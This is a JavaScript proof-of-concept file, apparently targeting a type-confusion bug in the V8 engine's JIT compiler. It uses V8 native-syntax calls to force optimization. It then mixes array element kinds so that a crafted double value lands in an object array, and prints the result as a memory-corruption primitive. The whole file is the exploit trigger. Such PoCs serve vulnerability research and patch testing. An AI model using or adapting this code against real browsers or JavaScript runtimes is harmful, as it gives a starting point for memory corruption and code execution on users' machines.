/*************************************************************
 * File Name: poc.js
 * 
 * Created on: 2020-08-12 04:10:33
 * Author: raycp
 * 
 * Last Modified: 2020-09-15 19:49:15
 * Description: 
************************************************************/
function opt(a, b) {

  b[0] = 0;
  a.length;

  // TransitionElementsKind
  a[0] = 0;

  b[0] = 9.431092e-317;
};

%PrepareFunctionForOptimization(opt);
let holey_obj_arr = new Array(1);
holey_obj_arr[0] = 'a';

let packed_double_arr1 = [1.1]
opt(holey_obj_arr, packed_double_arr1);
opt(holey_obj_arr, packed_double_arr1);

let packed_double_arr2 = [2.2]
opt(packed_double_arr2, packed_double_arr1);
opt(packed_double_arr2, packed_double_arr1);
%OptimizeFunctionOnNextCall(opt);

let evil_arr = [0.1];
opt(evil_arr, evil_arr);
print(evil_arr[0]);
